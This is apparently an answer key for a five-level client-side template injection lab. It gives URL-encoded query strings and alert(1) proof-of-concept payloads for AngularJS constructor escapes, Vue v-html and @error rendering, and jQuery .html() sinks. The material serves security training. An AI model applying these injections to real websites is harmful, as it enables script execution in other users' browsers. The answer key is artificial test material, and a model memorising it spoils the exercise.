# csti — solutions

Client-side template injection via AngularJS / Vue / jQuery sinks.

### csti-level1

`/csti/level1/?query=%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D`

- payload: `{{constructor.constructor('alert(1)')()}}`
- context: AngularJS 1.8 ng-app expression — sandbox removed, function constructor pop

### csti-level2

`/csti/level2/?query=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D`

- payload: `{{constructor.constructor('alert(1)')()}}`
- context: AngularJS 1.6 has no expression sandbox; constructor.constructor reaches Function

### csti-level3

`/csti/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: reflected into Vue data then rendered via v-html (raw HTML)

### csti-level4

`/csti/level4/?query=%3Cimg%20src=x%20%40error=%22alert(1)%22%3E`

- payload: `<img src=x @error="alert(1)">`
- context: Vue compiles #app innerHTML as template; @error is v-on:error

### csti-level5

`/csti/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: jQuery .html() parses HTML and runs handlers on insertion
